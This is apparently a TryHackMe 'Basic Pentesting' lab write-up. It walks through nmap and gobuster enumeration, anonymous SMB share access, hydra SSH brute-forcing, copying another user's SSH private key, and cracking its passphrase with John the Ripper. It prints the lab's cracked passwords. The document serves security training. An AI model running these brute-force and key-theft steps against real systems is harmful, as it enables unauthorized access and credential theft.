# Basic Pentesting
This is a machine that allows you to practise web app hacking and privilege escalation 

## 1. Deploy the machine and connect to our network 
- As usual connect to Tryhackme using the openvpn and deploy the machine.

## 2. Find the services exposed by the machine 
- Scan the target using nmap
```
❯ nmap -sC -sV -p- --min-rate 800 -oN basic 10.10.78.151

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8080/tcp open  http        Apache Tomcat 9.0.7
```

## 3. What is the name of the hidden directory on the web server(enter name without /)? 
- There are few ways to find hidden directory, either using gobuster or NSE
```
❯ gobuster dir -u http://10.10.234.3 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
Found one hidden directory on the web server	-> /development (Status: 301)

❯ nmap --script=http-enum -p80 10.10.78.151
PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|_  /development/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
```

## 4. User brute-forcing to find the username & password 
- First, we need to enumerate the target system to find out the username using enum4linux
```
❯ enum4linux -M -G -S 10.10.68.193
- This option will enumerate machine list, group and user list with share list

Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Sep 20 22:05:26 2020
 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.68.193
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.68.193    |
 ==================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ===================================== 
|    Session Check on 10.10.68.193    |
 ===================================== 
[+] Server 10.10.68.193 allows sessions using username '', password ''

 =========================================== 
|    Getting domain SID for 10.10.68.193    |
 =========================================== 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 =========================================== 
|    Machine Enumeration on 10.10.68.193    |
 =========================================== 
[E] Internal error.  Not implmented in this version of enum4linux.

 ========================================= 
|    Share Enumeration on 10.10.68.193    |
 ========================================= 
	Sharename       Type      Comment
	---------       ----      -------
	Anonymous       Disk      
	IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.68.193
//10.10.68.193/Anonymous	Mapping: OK, Listing: OK
//10.10.68.193/IPC$	[E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
```
- Then, use smbclient to mount and connect to the sharename.
```
❯ smbclient //10.10.68.193/Anonymous
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Apr 19 13:31:20 2018
  ..                                  D        0  Thu Apr 19 13:13:06 2018
  staff.txt                           N      173  Thu Apr 19 13:29:55 2018

❯ smbclient //10.10.68.193/IPC$
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
```
- Looks like there are interesting file in Anonymous sharename. Let's grab the file and take a look.
```
smb: \> get staff.txt
getting file \staff.txt of size 173 as staff.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)

❯ cat staff.txt
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay
```

## 5. What is the username? 
- Take a look at the previous result.

## 6. What is the password?
- Now that we know the username, the password can be crack using hydra.
```
❯ hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.68.193

Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-20 22:24:13
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.68.193:22/
[STATUS] 145.00 tries/min, 145 tries in 00:01h, 14344256 to do in 1648:46h, 16 active
[STATUS] 112.67 tries/min, 338 tries in 00:03h, 14344063 to do in 2121:55h, 16 active
[STATUS] 105.43 tries/min, 738 tries in 00:07h, 14343663 to do in 2267:32h, 16 active
[22][ssh] host: 10.10.68.193   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
```

## 7. What service do you use to access the server (answer in abbreviation in all caps)?
- It's obvious, look at the cracking process that we done. What protocol we specify to use?

## 8. Enumerate the machine to find any vectors for privilege escalation
- Login to the user account and enumerate the target.
```
❯ ssh jan@10.10.62.247

jan@basic2:~$ ls

jan@basic2:~$ whoami
jan

jan@basic2:~$ cat /etc/*release
......
VERSION="16.04.4 LTS (Xenial Xerus)"
......

jan@basic2:~$ pwd
/home/jan


jan@basic2:~$ ls -a
.  ..  .lesshst

jan@basic2:~$ cat .lesshst
cat: .lesshst: Permission denied

jan@basic2:~$ id
uid=1001(jan) gid=1001(jan) groups=1001(jan)

jan@basic2:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
kay:x:1000:1000:Kay,,,:/home/kay:/bin/bash
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
jan:x:1001:1001::/home/jan:/bin/bash

jan@basic2:~$ ls -l
total 0

jan@basic2:~$ cd ..

jan@basic2:/home$ ls
jan  kay

jan@basic2:/home$ cd kay

jan@basic2:/home/kay$ ls
pass.bak

jan@basic2:/home/kay$ cat pass.bak
cat: pass.bak: Permission denied

jan@basic2:/home/kay$ ls -la
total 48
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh

jan@basic2:/home/kay$ cd .ssh

jan@basic2:/home/kay/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub

jan@basic2:/home/kay/.ssh$ cat id_rsa

jan@basic2:/home/kay/.ssh$ cat id_rsa.pub
```
- We found 2 interesting files, id_rsa (private key) and id_rsa.pub (public key) for SSH. Copy the whole id_rsa, will be used as a means to escalate our privilege.
- Create a new file and paste the id_rsa to the file, name it as **id-rsa-pri**. The file can be set to be executed only by the owner.
```
❯ nano id-rsa-pri 
❯ chmod 700 id-rsa-pri
```
- Login attempt using the SSH private key is protected.
```
❯ ssh -i id-rsa-pri kay@10.10.62.247                                                                                                                                      ─╯
load pubkey "id-rsa-pri": invalid format
Enter passphrase for key 'id-rsa-pri':
```
- To overcome this challenge, we need to crack the SSH key using John The Ripper by point John the Ripper to the given hash file (hash.txt), with your dictionary (rockyou.txt)
```
❯ locate ssh2john
/usr/share/john/ssh2john.py

❯ /usr/share/john/ssh2john.py id-rsa-pri > hash.txt

❯ cat hash.txt 
id-rsa-pri:$sshng$1$16$6A....

❯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt             
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (id-rsa-pri)
1g 0:00:00:05 DONE (2020-09-20 23:25) 0.1996g/s 2862Kp/s 2862Kc/s 2862KC/sa6_123..*7¡Vamos!
Session completed
```
- As additional info, /etc/shadow file stores actual password in encrypted format (more like the hash of the password) for user’s account with additional properties related to user password. 
- Basically, it stores secure user account information. All fields are separated by a colon : symbol.
-  Usually password format is set to `$id$salt$hashed`, The `$id` is the algorithm used On GNU/Linux as follows:
```
$1$ is MD5
$2a$ is Blowfish
$2y$ is Blowfish
$5$ is SHA-256
$6$ is SHA-512
```

## 9. What is the name of the other user you found (all lower case)?
- The other user name that we found other than the first.

## 10. If you have found another user, what can you do with this information?
- Obviously, to escalate the privilege access

## 11. What is the final password you obtain?
- SSH to the target system using the cracked password.
```
❯ ssh -i id-rsa-pri kay@10.10.62.247

kay@basic2:~$ ls
pass.bak

kay@basic2:~$ cat pass.bak
```
